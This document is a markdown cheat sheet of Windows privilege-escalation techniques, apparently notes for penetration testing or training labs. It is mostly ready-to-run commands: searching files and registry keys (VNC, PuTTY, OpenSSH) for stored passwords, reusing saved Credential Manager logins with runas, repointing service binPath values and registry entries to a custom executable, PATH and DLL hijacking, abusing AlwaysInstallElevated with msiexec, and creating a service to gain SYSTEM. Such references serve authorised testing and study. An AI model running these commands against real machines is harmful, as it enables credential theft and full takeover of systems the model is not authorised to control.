# Password Hunting

## Interesting Files
|Command|Description|
|---|---|
|dir /b /a /s c:\ > C:\Users\\\$username\cdirs.txt|Perform dir on each directory and give results into cdirs.txt|

### Interesting extensions

```
.bak
.log
.bat
.cmd
.vbs
.cnf
.conf
.config
.ini
.xml
.txt
.gpg
.pgp
.p12
.der
.csr
.cer
.db
.reg
```

### Interesting Filenames

```
install
backup
unattend
unattended
sysprep
variables
setupinfo
web
sitelist
credentials
accessTokens
azureProfile
legacy_credentials
access_tokens
```

## Registry

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\OpenSSH\Agent\Keys"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Credential Manager
- Stores any usernames, passwords, and URLs related to web applications (Skype, etc.)

|Command|Description|
|---|---|
|cmdkey /list|List available credentials in Credential Manager|
|runas /savecred /user:\$CredentialUsername cmd.exe| Run program with saved credential|

# Unsecured Services

|Command|Description|
|---|---|
|wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v "\""| Enumerates all services and looks for unquoted service paths|
|accesschk.exe -accepteula -wuvc "\$GroupName" *|Looks for services that are modifiable by the GroupName|
|accesschk.exe -accepteula -wuvc "\$Username" *|Looks for services that are modifiable by the Username|
|accesschk.exe -accepteula -kvuqsw hklm\System\CurrentControlSet\services > outfile|Looks for registry entries that are modifiable and whom they are modifiable by|
|sc config \$ServiceName binPath="C:\\Path\\To\\EXE.exe"|Modify service binPath to point to custom exe file|
|reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\\$ServiceName /v \$ModifiableKey /t REG_EXPAND_SZ /d C:\\Path\\To\\EXE.exe /f|Add/overwrite registry entry to point to custom exe file|

### Addt'l Notes:
- Search the outfile generated with `accesschk.exe -accepteula -kvuqsw hklm\System\CurrentControlSet\services > outfile` for users and groups that you have control of

# Unsecured File System
|Command|Description|
|---|---|
|accesschk.exe -accepteula -wus "\$GroupName" c:\*.* > outfile.txt | Enumerate all files and directories modifiable by \$GroupName |
|accesschk.exe -accepteula -wus "\$Username" c:\*.* > outfile.txt | Enumerate all files and directories modifiable by \$Username |

# PATH variable Hijacking
- Search order is from left to right

|Command|Description|
|---|---|
|reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"|show full path variable|

# Missing Service

|Command|Description|
|---|---|
|autorunsc64.exe -a s \| more | Enumerate autoruns |

## Addt'l Notes
- Looking for writable directories that result in a File Not Found error.

# Missing Task

|Command|Description|
|---|---|
|autorunsc64.exe -a t \| more | Looks for tasks that have missing executables|
|schtasks /query /tn \$TaskName /xml | Queries task specified by Taskname and outputs results to XML|
|wmic useraccount where sid='\$SID'|If a SID is specified, you can also check via that|

# DLL Hijacking

|Command|Description|
|---|---|
|dumpbin /imports c:\\Path\\To\\EXE.exe|Dumps all imports performed within a binary|

## Addt'l Notes
- You can abuse PATH search order and place your malicious DLL where it looks first. DLL must match the full name of the file that is being looked for.

# Getting SYSTEM

## AlwaysInstallElevated

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
msiexec /quiet /qn /i c:\Path\To\MSI.msi
```

### Addt'l Notes
- If you see the 2 values set, any user can run msi installers and install software on the computer
- Use MSIwrapper to convert EXEs to MSIs

## New Service for SYSTEM

`sc create \$ServiceName binPath="C:\\Path\\To\\EXE.exe"`
